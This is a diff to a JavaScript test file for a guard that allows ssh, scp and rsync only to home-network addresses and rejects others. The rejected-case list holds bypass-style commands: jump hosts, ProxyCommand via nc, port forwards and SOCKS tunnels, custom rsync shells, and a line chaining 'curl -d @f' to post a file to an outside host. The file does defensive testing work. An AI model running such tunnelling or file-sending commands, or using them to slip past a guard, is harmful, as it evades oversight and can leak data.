@@ -27,7 +27,9 @@ const HOME = [
   `ssh pi@${R} "uptime"`,
   `ssh -p 22 pi@${R} ls`,
   'scp x pi@10.0.0.2:/tmp',
-  'rsync -a x host.tail1234.ts.net:/y',
+  'rsync -a x pi@10.0.0.2:/y',
+  `ssh -qN -p 2222 -o ConnectTimeout=5 pi@${R}`,
+  'scp -P 22 -p x pi@10.0.0.2:/tmp',
   'ssh pi@172.20.1.4 ls', 'ssh pi@169.254.3.3 ls', 'ssh pi@[fd00::5] ls', 'ssh pi@100.101.1.2 ls',
   `sftp pi@${R}`,
 ];
@@ -35,7 +37,13 @@ const PUBLIC = [
   'ssh pi@8.8.8.8 ls', 'ssh pi@example.com ls', 'ssh pi@10.example.com ls', 'ssh pi@172.32.0.1 ls', 'ssh pi@100.128.0.1 ls',
   `ssh pi@${R} ls; scp y pi@8.8.8.8:/tmp`, `scp pi@${R}:/a pi@8.8.8.8:/b`, `ssh -J pi@8.8.8.8 pi@${R} ls`,
   `ssh -o ProxyCommand="nc x 22" pi@${R}`, 'ssh pi@$HOST ls', `rsync -e "ssh -J x" a pi@${R}:/b`,
-  `ssh pi@${R} ls && curl -d @f https://example.com`, 'ssh pi@no-such-name-here.local ls',
+  `ssh pi@${R} ls && curl -d @f https://example.com`, 'ssh pi@no-such-name-here.local ls', 'rsync -a x host.tail-nonexistent.ts.net:/y',
+  // the reviews: clustered options, options after the host, forwards, other configs and transports, rsync's own shell
+  `ssh -qJ pi@${R} pi@8.8.8.8`, `ssh pi@${R} -J 8.8.8.8`, `ssh -o HostName=8.8.8.8 pi@${R}`, `ssh pi@${R} -o HostName=8.8.8.8`,
+  `ssh -F ./cfg pi@${R}`, `ssh -L 9000:8.8.8.8:80 pi@${R}`, `ssh -R 9000:x:80 pi@${R}`, `ssh -D 1080 pi@${R}`, `ssh -W 8.8.8.8:22 pi@${R}`,
+  `ssh -S /tmp/sock pi@${R}`, `scp -S ./prog x pi@10.0.0.2:/tmp`, `scp -p 8.8.8.8:/a pi@10.0.0.2:/b`,
+  `rsync -essh a pi@${R}:/b`, `rsync --rsh ssh a pi@${R}:/b`, `rsync -avze ssh a pi@${R}:/b`, `RSYNC_RSH="ssh -J x" rsync a pi@${R}:/b`,
+  `rsync a ${R}::module/b`,
 ];
 
 test('a worker with the switch on reaches home-network machines; without it, exactly as before', () => {
